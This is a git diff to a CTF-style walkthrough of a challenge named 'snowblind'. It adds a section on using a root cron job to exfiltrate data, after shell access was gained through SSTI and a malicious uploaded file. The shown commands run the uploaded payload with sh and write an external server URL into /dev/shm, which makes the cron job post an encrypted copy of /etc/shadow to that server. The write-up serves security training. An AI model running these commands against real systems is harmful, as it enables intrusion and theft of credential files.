@@ -124,7 +124,7 @@ The following indexes where discovered that would allow RCE:
 
 ![SSTI Enumeration](/images/snowblind_enumeration2.jpg) 
 
-Step Three: Achieve Shell Access : Insecure File Upload
+##Step Three: Achieve Shell Access : Insecure File Upload
 
 The following payload was inserted into a file called payload.jpg and uploaded to the admin profile.
 
@@ -139,8 +139,29 @@ Selecting index 205 with get > os > popen.read() as our target, the following co
 sh /app/static/images/admin\\u005ff1f9cc53781abb79\\u002epng
 ```
 
+##Step Four: Exfilitrate Data : Insecure processes / Data Leakage
 
-Step Four: Exfilitrate Data : Insecure processes / Data Leakage
+With initial access established, time for more recon. An interesting cron job was located in /etc/cron/cron.d/mycron. It runs a backup script every minute as root. 
+
+![Cron Job](/images/snowblind_cronjob.jpg) 
+
+The script does the following:
+- it looks for a file in /dev/shm with a name formatted according to this pattern: '\\.frosty[0-9]+$'
+- it reads the file and applies a regular expression that requires at least the final two characters of the url to be letters and not numbers
+- if the regular experssion is true, it encrypts a copy of /etc/shadow and posts it to the url
+
+![URL Regex](/images/snowblind_regex.jpg) 
+
+A copy of the backup script is located here: [Backup Script](/resources/snowblind_backup.py)
+
+An HTTP server was started on an external facing linux server on port 8000 to receive the data being exfitrated.
+
+The following command was issued in the shell as www-data to trigger the data exfiltration. The file was created, and moments later it was deposited on my web server.
+
+```
+echo "http://45-79-190-29.ip.linodeusercontent.com:8000/exfil" > /dev/shm/.frosty999
+```
+
 Step Five:  Decode PNG file : Leak Sensitive Information
 Step Six: Crack Hash for Root : Weak Password 
 Step Seven: Escalate privileges : Escalate privileges
